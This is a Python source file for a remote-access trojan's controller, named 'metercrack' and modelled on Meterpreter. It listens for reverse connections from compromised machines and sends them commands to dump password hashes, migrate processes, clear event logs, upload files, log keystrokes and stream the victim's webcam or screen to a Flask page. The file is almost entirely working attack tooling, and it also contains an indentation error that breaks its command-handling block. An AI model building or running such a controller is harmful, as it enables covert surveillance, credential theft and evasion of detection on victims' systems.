import socket
import threading
import time
from flask import Flask, Response, request, render_template_string
from colorama import Fore, Style, init
import cv2
import numpy as np
import sys
import os
import keyboard  # Import the keyboard library

init(autoreset=True)

app = Flask(__name__)
clients = {}
server_thread = None
streaming = False
keylogger_data = []  # List to store keylogger data
keylogger_running = False  # Flag to check if keylogger is running

# HTML template for video streaming with a stop button
html_template = """
<!doctype html>
<html lang="en">
  <head>
    <title>Video Streaming</title>
  </head>
  <body>
    <h1>Video Streaming</h1>
    <div>
      <img src="{{ url_for('video_feed') }}" width="640" height="480">
    </div>
    <button onclick="stopStreaming()">Stop Streaming</button>
    <script>
      function stopStreaming() {
        fetch('/stop_streaming')
          .then(response => response.text())
          .then(data => alert(data));
      }
    </script>
  </body>
</html>
"""

def start_streaming(client_socket, mode):
    global streaming
    streaming = True
    print(Fore.BLUE + "[ * ] Starting...")
    time.sleep(1)
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    @app.route('/')
    def index():
        return render_template_string(html_template)

    @app.route('/video_feed')
    def video_feed():
        return Response(generate_frames(client_socket),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    @app.route('/stop_streaming')
    def stop_streaming():
        global streaming
        streaming = False
        return "Streaming stopped", 200

    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
    print(Fore.BLUE + "[ * ] Streaming...")

    # Run the Flask app in a separate thread to handle the streaming
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()

def generate_frames(client_socket):
    global streaming
    while streaming:
        data = client_socket.recv(921600)
        if not data:
            break
        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

def keylogger_callback(event):
    global keylogger_data
    keylogger_data.append(event.name)

def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(keylogger_callback)
        keylogger_running = True
        print(Fore.YELLOW + "[ * ] Keylogger started.")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print(Fore.YELLOW + "[ * ] Keylogger stopped.")

def dump_keylogger_data():
    global keylogger_data
    return '\n'.join(keylogger_data)

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")

    while True:
        try:
            command = input(Fore.MAGENTA + "metercrack > ")
        except EOFError:
            break

        print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
        client_socket.send(command.encode('utf-8'))

        # Handle the response from the client for different commands
        if command == "hashdump":
            print(Fore.YELLOW + "[ * ] Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE +  response)

        elif command == "migrate":
            print(Fore.YELLOW + "[ * ] Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "clearev":
            print(Fore.YELLOW + "[ * ]  Starting......")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "upload":
            print(Fore.YELLOW + "[ * ]  Starting...")
            # In this case, we're not asking for file input, just sending the command to the client
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "keyscan_start":
            start_keylogger()
            continue

        elif command == "keyscan_stop":
            stop_keylogger()
            continue

        elif command == "keyscan_dump":
            print(Fore.WHITE + dump_keylogger_data())
            continue

      if command.startswith("webcam_stream") or command.startswith("screenshare"):
            mode = command.split('_')[0]
            start_streaming(client_socket, mode)
            continue
        
        elif command.startswith("webcam_list"):
            print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
            client_socket.send(command.encode('utf-8'))
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)



def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
    print(Fore.GREEN + "[ * ] Listening for incoming connections...")

    while True:
        client_socket, addr = server_socket.accept()
        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
